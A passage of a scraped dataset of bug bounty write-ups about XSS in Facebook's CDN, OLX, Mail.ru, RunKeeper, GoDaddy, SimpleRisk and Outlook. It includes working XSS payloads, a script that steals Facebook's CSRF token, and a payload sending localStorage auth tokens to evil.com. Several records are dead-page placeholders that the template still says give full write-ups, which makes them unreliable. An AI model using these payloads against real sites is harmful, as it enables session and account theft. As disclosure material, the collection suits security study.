describes encoding data into the IDAT chunk, which ensures it’ll stay there even after the modifications Facebook’s image uploader makes. The author kindly provides a proof-of-concept image , which worked perfectly (the PHP shell obviously won’t execute, but it demonstrates that the data survived uploading). Now, I could have submitted the bug there and then - we’ve got proof that images can be served with a content type of text/html , and angle brackets aren’t encoded (which means we can certainly inject HTML). But that’s boring, and everyone knows an XSS isn’t an XSS without an alert box. The author also provides an XSS ready PNG , which I could just upload and be done. But since it references a remote JS file, I wasn’t too keen on the bug showing up in a referer log. Plus I wanted to try myself to create one of these images. As mentioned in post, the first step is to craft a string, that when compressed using DEFLATE , produces the desired output. Which in this case is: <SCRIPT src=//FNT.PE><script> Rather than trying to create this by hand, I used a brute-force solution (I’m sure there are much better ways, but I wanted to whip up a script and leave it running): Convert the desired output to hex - 3c534352495054205352433d2f2f464e542e50453e3c2f7363726970743e Prepend 0x00 -> 0xff to the string (one to two times) Append 0x00 -> 0xff to the string (one to two times) Attempt to uncompress the string until an error isn’t thrown Check that the result contains our expected string The script took a while to run, but it produced the following output: 7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f Compressing the above confirms that we get our string back: fin1te@mbp /tmp » php -r \"echo gzdeflate(hex2bin('7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f')) . PHP_EOL;\" ??<SCRIPT SRC=//FNT.PE></script> Combining the result, with the PHP code for reversing PNG filters and generating the image, gives us the following: Which, when dumped, shows our payload: fin1te@mbp /tmp » hexdump -C xss-fnt-pe-png.png 00000000 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.PNG........IHDR| 00000010 00 00 00 20 00 00 00 20 08 02 00 00 00 fc 18 ed |... ... ........| 00000020 a3 00 00 00 09 70 48 59 73 00 00 0e c4 00 00 0e |.....pHYs.......| 00000030 c4 01 95 2b 0e 1b 00 00 00 65 49 44 41 54 48 89 |...+.....eIDATH.| 00000040 63 ac ff 3c 53 43 52 49 50 54 20 53 52 43 3d 2f |c.. <SCRIPT SRC=/ | 00000050 2f 46 4e 54 2e 50 45 3e 3c 2f 73 63 72 69 70 74 | /FNT.PE></script | 00000060 3e c3 ea c0 46 8d 17 f3 af de 3d 73 d3 fd 15 cb | > ...F.....=s....| 00000070 43 2f 0f b5 ab a7 af ca 7e 7d 2d ea e2 90 22 ae |C/......~}-...\".| 00000080 73 85 45 60 7a 90 d1 8c 3f 0c a3 60 14 8c 82 51 |s.E`z...?..`...Q| 00000090 30 0a 46 c1 28 18 05 a3 60 14 8c 82 61 00 00 78 |0.F.(...`...a..x| 000000a0 32 1c 02 78 65 1f 48 00 00 00 00 49 45 4e 44 ae |2..xe.H....IEND.| 000000b0 42 60 82 |B`.| We can then upload it to our advertiser library, and browse to it (with an extension of .html ). Bypassing Link Shim What can you do with an XSS on a CDN domain? Not a lot. All I could come up with is a LinkShim bypass. LinkShim is script/tool which all external links on Facebook are forced through. This then checks for malicious content. CDN URL’s however aren’t Link Shim’d, so we can use this as a bypass. Moving from the Akamai CDN hostname to *.facebook.com Redirects are pretty boring. So I thought I’d check to see if any *.facebook.com DNS entries were pointing to the CDN. I found photo.facebook.com (I forgot to screenshot the output of dig before the patch, so here’s an entry from Google’s cache): Browsing to this host with our image as the path loads a JavaScript file from fnt.pe , which then displays an alert box with the hostname. Any session cookies are marked as HTTPOnly , and we can’t make requests to www.facebook.com . What do we do other than popping an alert box? Enter document.domain It’s possible for two pages from a different origin, but sharing the same parent domain, to interact with each other, providing they both set the document.domain property to the parent domain. We can easily do this for our page, since we can run arbitrary JavaScript. But we also need to find a page on www.facebook.com which does the same, and doesn’t have an X-Frame-Options header set to DENY or SAMEORIGIN (we’re still cross-origin at this point). This wasn’t too difficult to find - Facebook has various plugins which are meant to be placed inside an <iframe> . We can use the Page Plugin . It sets the document.domain property, and also contains fb_dtsg (the CSRF token Facebook uses). What we now need to do is load the plugin inside an iframe, wait for the onload event to fire, and extract the token from the content. document . domain = ' facebook.com ' ; var i = document . createElement ( ' iframe ' ); i . setAttribute ( ' id ' , ' i ' ); i . setAttribute ( ' style ' , ' visibility:hidden;width:0px;height:0px; ' ); i . setAttribute ( ' src ' , ' https://www.facebook.com/v2.4/plugins/page.php?adapt_container_width=true&app_id=113869198637480&channel=https%3A%2F%2Fs-static.ak.facebook.com%2Fconnect%2Fxd_arbiter%2FX9pYjJn4xhW.js%3Fversion%3D41%23cb%3Df365065abc%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff366e4bcac%26relation%3Dparent.parent&container_width=588&hide_cover=false&href=https%3A%2F%2Fwww.facebook.com%2Ffacebook&locale=en_GB&sdk=joey&show_facepile=true&show_posts=true&small_header=false ' ); i . onload = function (){ alert ( document . domain + \" \\n fb_dtsg: \" + i . contentWindow . document . getElementsByName ( ' fb_dtsg ' )[ 0 ]. value ); }; document . body . appendChild ( i ); Notice how the alert box now shows facebook.com , not photos.facebook.com . We now have access to the user’s CSRF token, which means we can make arbitrary requests on their behalf (such as posting a status, etc). It’s also possible to issue XHR requests via the iframe to extract data from www.facebook.com (rather than blindly post data with the token). So it turns out an XSS on the CDN can do pretty much everything that one on the main site can. Fix Facebook quickly hot-fixed the issue by removing the forward DNS entry for photo.facebook.com . Whilst the content type issue still exists, it’s a lot less severe since the files are hosted on a sandboxed domain. Bonus ASCII Art One easter-egg I found was that if you append .txt or .html to the URL (rather than replace the file extension), you get a cool ASCII art version of the image. This also works for images on Instagram (since they share the same CDN). Try it out yourself : websec bugbounty xss facebook cdn png content-type Updated on January 27, 2016 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://zombiehelp54.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html", "title": "Mahmoud Gamal", "friendly_explanation": "This is a bug bounty writeup from https://zombiehelp54.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMahmoud Gamal Skip to main content Search This Blog Mahmoud Gamal Sorry, the page you were looking for in this blog does not exist. Powered by Blogger Theme images by Michael Elkan Mahmoud Gamal Visit profile Report Abuse"}
{"source_url": "https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@bughunter.sec7/reflected-xss-on-alibabacloud-com-4e652fcca22f", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/reflected-xss-on-alibabacloud-com-4e652fcca22f. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@bughunter.sec7/self-xss-on-komunitas-bukalapak-com-b8a28dce4fbd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@paulorcchoupina/a-real-xss-in-olx-7727ae89c640", "title": "A real XSS in OLX Bug Bounty. I saw a couple of other write-ups and… | by Paulo Choupina | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@paulorcchoupina/a-real-xss-in-olx-7727ae89c640. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nA real XSS in OLX Bug Bounty. I saw a couple of other write-ups and… | by Paulo Choupina | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in A real XSS in OLX Bug Bounty Paulo Choupina 2 min read · Mar 21, 2019 -- 1 Listen Share I saw a couple of other write-ups and blog posts about “XSS in OLX” but when I got to read them, they end up being either stored XSS or in some other website that belongs within the scope of OLX… SO!! I figured, “hey if they are good enough for a write-up, so it’s my bug.” xD Original report: https://hackerone.com/reports/477771 I was looking for bugs on another website when I came across this. It is a reflected Cross Site Scripting (XSS) vulnerability in the parameter search[user_id] located at the main page of Olx.pt If you navigate to Olx.pt and choose a random item, open that item page and click “outros anúncios” as in “other ads” you will get redirected to: https://www.olx.pt/ads/?search%5Buser_id%5D=xxx&view=galleryWide Within that page, the parameter search[user_id] was vulnerable to XSS. POC: https://www.olx.pt/braga/?search%5Buser_id%5D=1zqjeu'%22()%7B%7D <x>:/1zqjeu;9</SCript><svG/onLoad=prompt(9)>, ;prompt(9);&view=galleryWide Press enter or click to view image in full size It was across all the domains, here is an example of it in Poland’s domain: https://www.olx.pl/lubelskie/?search%5Buser_id%5D=1zqjeu'%22()%7B%7D <x>:/1zqjeu;9</SCript><svG/onLoad=prompt(9)>, ;prompt(9);&view=galleryWide Press enter or click to view image in full size I reported it and got added to the OLX’s Hall of Fame: https://security.olx.com/security-hall-of-fame.html Kudos to me!! xD Security Bug Bounty -- -- 1 Written by Paulo Choupina 20 followers · 1 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.seekurity.com/blog/general/stored-xss-in-the-heart-of-the-russian-email-provider-giant-mail-ru/", "title": "Stored XSS in the heart of the Russian email provider giant (Mail.ru) – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/stored-xss-in-the-heart-of-the-russian-email-provider-giant-mail-ru/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS in the heart of the Russian email provider giant (Mail.ru) – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later Stored XSS in the heart of the Russian email provider giant (Mail.ru) Seif Elsallamy comment 0 Comments access_time 4 min read Hi, I’m Seif Elsallamy a bug hunter from Seekurity Team, Today i will show you a critical reflected Cross Site Scripting bug affecting mail.ru and could be used as an XSS worm but first let’s dive into some general information. What is mail.ru? mail.ru is a Russian mailing services like yahoo, hotmail and gmail. Mail.Ru Group, ООО (commonly referred to as Mail.Ru) is a Russian Internet company. It was started in 1998 as an e-mail service and went on to become a major corporate figure in the Russian-speaking segment of the Internet. As of 2013 according to comScore, websites owned by Mail.ru collectively had the largest audience in Russia and captured the most screen time. Mail.Ru’s sites reach approximately 86% of Russian Internet users on a monthly basis and the company is in the top 5 of largest Internet companies, based on the number of total pages viewed. Mail.ru controls the 3 largest Russian social networking sites. It operates the second and third most popular Russian social networking sites, Odnoklassniki and Moi Mir, respectively. Mail.ru holds 100% of shares of Russia’s most popular social network VKontakte and minority stakes in Qiwi, formerly OE Investments (15.04%). It also operates two instant messaging networks (Mail.Ru Agent and ICQ), an e-mail service and Internet portal Mail.ru, as well as a number of online games. What is Cross-site scripting AKA XSS? And why ours is stored? Cross-site scripting simply is a security bug that may affect websites allowing users (Attackers) to inject scripts (javascript) to another users (Victims) to modify or steal there data as example, session emails passwords page content. Stored Cross-site scripting is an XSS type which if successfully injected it will be stored permanently in the application’s database and retrieved whenever the user call back a vulnerable page calling this stored payload What is eml files? Used by many email clients including Novell GroupWise, Microsoft Outlook Express, Lotus notes, Windows Mail, Mozilla Thunderbird, and Postbox. .eml files contain the email contents as plain text in MIME format, containing the email header and body, including attachments in one or more of several formats. Now lets back to mail.ru bug…. Mail.ru is parsing .eml files and fetches the “subject” automatically then reflecting it in the email subject without sanitizing, filtering or validating it for malicious content which was the main root cause for our Stored XSS to occur. So to reproduce this behavior, We simply created a new eml file “test.eml”, Edited this file and included a simple XSS payload ie. “subject : <script>alert(“XSS”);</script>” then we saved the file, After that we went to we navigated to “m.mail.ru” (the mobile version of mail.ru), Created a new mail, uploaded the eml file and then we hit “send” Once a victim receive our malicious message, Opening it, you will find this lovely and cute popup alert box with word “XSS” inside it which mean that the script has been executed so that’s mean XSS occurs. Impact of a simple attack scenario: Imagine that an XSS work behavior which spreads over your mail.ru contacts, send the same malicious message to all of your contact with a JS execution of stealing user’s session and act on behalf of the currently logged in user! And possibilities are endless here. PoC Video: We responsibly disclosed the vulnerability to Mail.ru through their HackerOne bug bounty program and they fixed it and rewarded us with a generous bounty, Thanks Mail.ru Original source of the report: https://hackerone.com/reports/116570 Hey! Building a website, an application or any kind of business? Or already have one? Worried about your security? Think twice before going public and let us protect your business ! (Mail.ru) email giant in provider Russian Stored the XSS Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Vulnerability in Metasploit Project aka CVE-2017-5244 Translate this blog Scroll Up"}
{"source_url": "https://www.seekurity.com/blog/general/runkeeper-stores-xss-vulnerability/", "title": "RunKeeper Stored XSS Vulnerability – Where worms are able to run too! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/runkeeper-stores-xss-vulnerability/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRunKeeper Stored XSS Vulnerability – Where worms are able to run too! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later RunKeeper Stored XSS Vulnerability - Where worms are able to run too! Mohamed A. Baset comment 4 Comments access_time 4 min read RunKeeper is a GPS fitness-tracking app for iOS and Android with over 40 million users. First launched in 2008 by CEO Jason Jacobs with the help of “moonlighting engineers”. In late 2011 RunKeeper secured $10 million in a Series B financing, led by Spark Capital. In February, 2016, RunKeeper was acquired by ASICS. In May 2016, the RunKeeper software came to the attention of the Norwegian Consumer Council for breaching European data protection laws. It is alleged to continue tracking user’s locations after the application is terminated and to share this information with advertisers in ways that exceed the bounds of the application’s terms and conditions. . About the discovered vulnerabilities: 1. Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted web sites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws . 2. Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. . The bug(s): In the proof of concept scenario we found 2 issues, First a stored cross site scripting affecting “RunKeeper user profile name” where the payload is stored in the database and will be reflected whenever the public user profile page called by any user, Sometimes a stored cross site scripting issue is more sever than a SQLi which results in accessing a fully encrypted user data, Second a site-wide cross site request forgery where users can follow other users via a GET request (since the website is suffering from CSRF issues allover its parts)! .. CSRF PoC Code: https://runkeeper.com/ relationship ?request=& target = 36973602 . PoC Video and attack scenario: . Notes on the attack scenario: As you may noticed in the PoC Video our XSS payload was used to perform a follow request to the owner of the vulnerable profile which turn it into a site-wide XSS Worm behaviour, In the worst scenario we can use this Stored XSS to inject our payload on any potential profile visits ours. Also we shortened the XSS payload using google shortening service since there is a payload length limitation and the payload reflection in the page source context won’t be executed if it exceeds the limit! We are aware that a stored XSS can simulate mouse clicks, Reading the anti-csrf token and perform form submits, etc… but we tried here to merge two attacks to demonstrate how attackers are able to perform a more severe impact. . Differentiation: We spotted the vulnerability without the knowledge of it’s existence before, the issue was originally reported by security researcher David Sopas and was fixed on Nov 12, 2013 On Oct 10, 2015 Seekurity team tried to give it another shot while doing some investigations to be sure if we can relay on the service for a personal use we were able to bypass the fix made by RunKeeper Security team. . The Fix: RunKeeper Security Team mitigated the issue root cause totally by doing a proper user input validation and an Anti-CSRF tokened requests! . . Hey! Building a website? Or already built a one? Think twice before going public and let us protect your business ! able are run RunKeeper Stores to too! Vulnerability Where worms XSS Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Pingback: 7月07日-每日安全知识热点 – 网络与信息安全 Pingback: July 7 – Daily safety knowledge hotspots – 网络与信息安全 Pingback: July 7 – Daily safety knowledge hotspots – 国内安全新闻资讯 Pingback: Julio 7 – puntos de conocimiento de seguridad diaria – 网络与信息安全 Next article Cookie stuffing: How we are part of a fraud of millions of dollars Translate this blog Scroll Up"}
{"source_url": "https://www.seekurity.com/blog/write-ups/godaddy-xss-affects-parked-domains-redirector-processor/", "title": "Godaddy XSS affects parked domains redirector/processor! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/write-ups/godaddy-xss-affects-parked-domains-redirector-processor/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nGodaddy XSS affects parked domains redirector/processor! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in PoC Gallery , Write Ups Tweet Share Read later Godaddy XSS affects parked domains redirector/processor! Mohamed A. Baset comment 0 Comments access_time 1 min read Hi Folks, I’m not going to talk a lot about this issue because it’s a little bit trivial but it affects Godaddy’s parked domains redirector/processor. First, What is Godaddy? For all of you who don’t know Godaddy GoDaddy Inc. is an American publicly traded Internet domain registrar and web hosting company. As of May 2017, GoDaddy has served approximately 17 million customers and had over 6000 employees worldwide.The company is known for its advertising. It has been involved in several controversies related to censorship. Getting directly down to the details: Our early STaaS (Security Testing as a Service, Vulnerability and Risk Management Platform) Sonarify managed to find a cross site scripting vulnerability affecting mcc.godaddy.com which can be used in stealing cookies, phishing attacks and many more. (Read about the usages of XSS vulnerability) This vulnerability could be reproduced by issuing a GET request to http://mcc.godaddy.com/park/[PARKED_DOMAIN]?72565%27%3balert(document.domain)%2f%2f146=1 For example: http://mcc.godaddy.com/park/rUMuqUO1ozRhpTW6?72565%27%3balert(document.domain)%2f%2f146=1 The PoC Video (shows the vulnerable redirect code along with our javascript injection): Godaddy fixed the issue and rewarded Seekurity team with a generous bounty, Thanks Godaddy! Hey! Building a website? Or already built a one? Worried about your security? Think twice before going public and let us protect your business ! domains Godaddy. XSS. affects parked processor redirector Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Let's steal some tokens! Translate this blog Scroll Up"}
{"source_url": "https://www.seekurity.com/blog/general/reflected-xss-vulnerability-in-simplerisk/", "title": "CVE-2017-10711: Reflected XSS vulnerability in SimpleRisk – Open Source Risk Management System – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/reflected-xss-vulnerability-in-simplerisk/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCVE-2017-10711: Reflected XSS vulnerability in SimpleRisk – Open Source Risk Management System – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in Advisories , General , PoC Gallery , Write Ups Tweet Share Read later CVE-2017-10711: Reflected XSS vulnerability in SimpleRisk - Open Source Risk Management System Mohamed A. Baset comment 0 Comments access_time 2 min read Hi Guys, Today we will discuss about a basic hunt of a reflected cross site vulnerability in SimpleRisk platform but first lets know some general details about the platform itself What is SimpleRisk? SimpleRisk is an open-source risk management system released under Mozilla Public License and used for risk management activities. It enables risk managers to account for risks, plan mitigation measures, facilitate management reviews, prioritize for project planning, and track periodic reviews. SimpleRisk allows risk managers to prioritize enterprise responses according to the severity of threats and vulnerabilities that could impact the business. SimpleRisk sports a dashboard for submitting a new risk for consideration by your team, for creating risk reports and graphs of risk levels and locations. Highly configurable, SimpleRisk report generation is dynamic; risk formulas could be tweaked on the fly. Now let’s dive into the technical details: The “user” field in SimpleRisk’s user password reset form is not properly sanitized/filtered against dangerous user input resulted in executing javascript in the context of the app hence Steal SimpleRisk users sessions, Perform actions on behalf of SimpleRisk users, Hijack Session Cookies, etc.. In the heart of reset.php file: As you may notice in this commit the value of “user” input was echoed directly to the view without being filtered Vulnerability Type: Reflected Cross Site Scripting More info: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) Vulnerability Exploitation: Through POST based CSRF Version affected: => 20170614-001 Vulnerable Request: POST /simplerisk/reset.php HTTP/1.1 Host: IP Cache-Control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: gzip, deflate Content-Length: 128 Content-Type: application/x-www-form-urlencoded user='”–> </style></script> <script> alert(document.domain)</script> &token=&password= &repeat_password= &password_reset= Vulnerable Parameter: User Payload used: ‘”–></style></script><script>alert(document.domain)</script> Proof of concept Video: Advisory: CVE-2017-10711 Hey! Building a website, an application or any kind of business? Or already have one? Worried about your security? Think twice before going public and let us protect your business ! CVE-2017-10711 in. SimpleRisk Management Open Reflected Risk Source System Vulnerability XSS Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Stored XSS in the heart of the Russian email provider giant (Mail.ru) Translate this blog Scroll Up"}
{"source_url": "https://omespino.com/write-up-1000-usd-in-5-minutes-xss-stored-in-outlook-com-ios-browsers/", "title": "WRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) – @omespino", "friendly_explanation": "This is a bug bounty writeup from https://omespino.com/write-up-1000-usd-in-5-minutes-xss-stored-in-outlook-com-ios-browsers/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) – @omespino Skip to content Menu BLOG EN ESPAÑOL @omespino just another security blog. Written by omespino March 14, 2019 March 29, 2022 WRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) Introduction: Hi everyone It’s been a while since my last post but I’m back, I want to tell you a short story about the Microsoft bug bounty program and why you can always check the basic payloads because you will surprise that some times will work: SPOILER ALERT: I highly recommend Miscrosoft Bug Bounty Program , in my experience their program is much better compared with another big companies programs This blogpost appeared first in the book Bug Bounty Write Ups Collection Title: XSS Stored on outlook.com (iOS) via doc file. Product / URL: ​ outlook.com iOS browser (Google chrome) Report sent via secure@microsoft.com Hi ​Microsoft Security team. I’ve found a XSS ​stored ​ in​ ​outlook.live.com ​in iOS ​ browsers via msoffice (ppt) file. POC: 1.- Create a msoffice document per example a power point presentation with an hyperlink pointing to the url address “javascript:prompt(document.cookie)” and save as “Powerpoint presentation 97-2003 Presentation”, Is very important save the doc as 97-2003, if you don’t save the document as this version the bug reproduction may not work. 2.- Login ​in​ to ​outlook.live.com ​(outlook email)​, upload to msoffice ppt file ​and send the file via email. 3.- ​ Login into ​outlook.live.com ​(outlook email)​ in Google chrome iOS browser, open the email with the special crafted document, click the attachment and then click download, after that the document ppt will render in Google chrome ​,​ ​then click the hyperlink and see the XSS (shows up the document.cookie). ​ Something important to highlight is: At this time you have a “magic” link that points directly to the ppt special crafted document. ​ ​4​ .- Open the link directly ​in Chrome iOS browser, click the hyperlink, and ​ see​ the XSS(shows up ​again ​ the document.cookie) ​, ​ if you open the link in any iOS browser like Safari, Firefox, Chrome, Opera the XSS works, you just need to be logged in your ​outlook account, only works in iOS). Impact Stored XSS allows an attacker to embed a malicious and arbitraries scripts into a vulnerable page, which is then executed when a victim views the page. Environment iPhone 6 – iOS v11.2.5. ​Safari Lastest version Google Chrome Lastest version ​My personal email account and all testing was seding emails to myself. Microsoft HOF (November 2018): https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services?rtc=1 Report Timeline 21 Feb 2018: Sent the report to secure@microsoft.com 21 Feb 2018: Got confirmation from Microsoft team and team begin the investigation 23 Mar 2018: Microsft team ask for some details 23 Mar 2018: Sent details to Microsoft team 26 Jul 2018: Update from the team that the investingation was still in progress 07 Nov 2018: Update from the team that saying that it appears that the submission qualifies for Bounty 26 Nov 2018: Microsoft Reward paid through their payment system – [Profit] 04 March 2019: Ask for disclose permission 14 March 2019: Disclose permission granted from Microsoft team well that’s it, share your thoughts, what do you think about how they handle that security issue? if you have any doubt, comments or sugestions just drop me a line here or on Twitter @omespino , read you later. Facebook Tweet LinkedIn Shares 76 8 thoughts on “ WRITE UP – $1,000 USD, XSS STORED IN OUTLOOK.COM (IOS BROWSERS) ” Emad Shanab says: March 15, 2019 at 12:24 pm Great work buddy as always. Thanks for sharing. Reply omespino says: March 15, 2019 at 3:18 pm Thanks for your thoughts and thanks for reading mate. Reply donReddy says: March 16, 2019 at 10:40 am Nice finding bro. Reply omespino says: March 17, 2019 at 8:26 pm Thanks mate Reply Abde Ouabala says: March 18, 2019 at 4:42 pm Great Writeup Dude! Reply omespino says: March 18, 2019 at 7:59 pm cool, thanks for reading Reply Fat says: October 31, 2019 at 12:09 am You are amazing Reply omespino says: November 1, 2019 at 7:13 pm thanks mate and thank you for reading Reply Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Comment * Name Email Website Post navigation Previous Post TUTORIAL – UNIVERSAL ANDROID SSL PINNING IN 10 MINUTES WITH FRIDA Next Post WRITE UP – GOOGLE BUG BOUNTY: LFI ON PRODUCTION SERVERS in “springboard.google.com” – $13,337 USD @OMESPINO BLOG EN ESPAÑOL"}
{"source_url": "http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html", "title": "Stealing local storage data through XSS", "friendly_explanation": "This is a bug bounty writeup from http://blog.h4rsh4d.com/2019/04/stealing-local-storage-data-through-xss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStealing local storage data through XSS Skip to main content Search This Blog Security Blog By @h4rsh4d Stealing local storage data through XSS Get link Facebook X Pinterest Email Other Apps April 25, 2019 Stealing local storage data through XSS In this blog, I'm going to show how to steal local storage data and one of my same finding on bugcrowd.😀 See screen shot below which is storing sensitive data in Local Storage. Local Storage. Its easy to steal this Local stored data through javascript localStorage.getItem() function. lets alert this data through console for demonstration. Payload : alert(localStorage.getItem('access_token')) Simple Example through Console I have found same challenge previously on bugcrowd private program. Authorisation token was responsible to handle web application session but they are storing that authorisation token in local storage. which is not a good way to protect session tokens. So i manged to find Stored XSS on that program and that XSS is getting executed on Admin Account. Bingo !! 😜 it take me 2 min to craft payload and steal that authorisation token. ezpz 😎 I submitted that vulnerability as Stored XSS to Admin Account Takeover. 😅 Final Payload : <img src=x onerror=\"document.location='https://evil.com?key='+window.localStorage.getItem('simple_auth:session')\"> JavaScript will pickup local storage data and concat it to end of the string at the time of onerror event handler execution. after that it will redirect to evil.com with data. i.e local stored data. Redirection towards attackers server. Attacker server received Local Stored data Note : it's recommended not to store sensitive information in local storage. 😂 Bounty awarded : $800 (Happy with it) 😄 Thanks for Readings .. 💜💜💚 Get link Facebook X Pinterest Email Other Apps Comments Smaran 27 April 2019 at 05:30 Nice one brother. Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog March 17, 2018 OLX Reflected XSS on Resend Code link !! This is my first write up ! sharing is caring !! 😎 This is not big finding , just one of my noob xss that i have found on OLX.in To change password , OLX firstly sends OTP to registered phone number and hold on for user to enter OTP number but on the same page they have provided the link which resend code (which get highlight after some seconds if user failed to enter the code) so i checked the request and response of that resend code functionality and its pretty sending mobile number and hash as parameter ph=\"phone number\" & h=\"hash\" I changed that default user \"ph\" value to victims number but no luck because of another parameter \"h=xxxxxxxxxxxxxxxxxxxx\" (hash) 😫 So after that i decided to test for XSS on same functionality and found one ! ✌😜 OLX Reflected XSS I checked the context and entered payload in \"ph\" parameter ph= \" onmouseover=\"alert... Read more open redirect bypass August 09, 2022 Simple Open Redirect Bypass. Was checking the login page for XSS and other stuff. noticed that the login page had one hidden parameter. \" returnToUrl \" Here, Application had some server-side protection which was checking user input URL's. Payload : https://google.com : forbidden Payload : //google.com : forbidden Payload: https://142.250.188.4 : forbidden Bypass Payload: https: /// google.com https://example.com/something/do/login?returnToUrl=https: /// google.com 💜 Read more Powered by Blogger Theme images by Radius Images Harshad Gaikwad Twitter : @h4rsh4d Linkedin : https://in.linkedin.com/in/h4rsh4d Visit profile Archive August 2022 1 June 2020 1 April 2019 1 March 2018 1"}
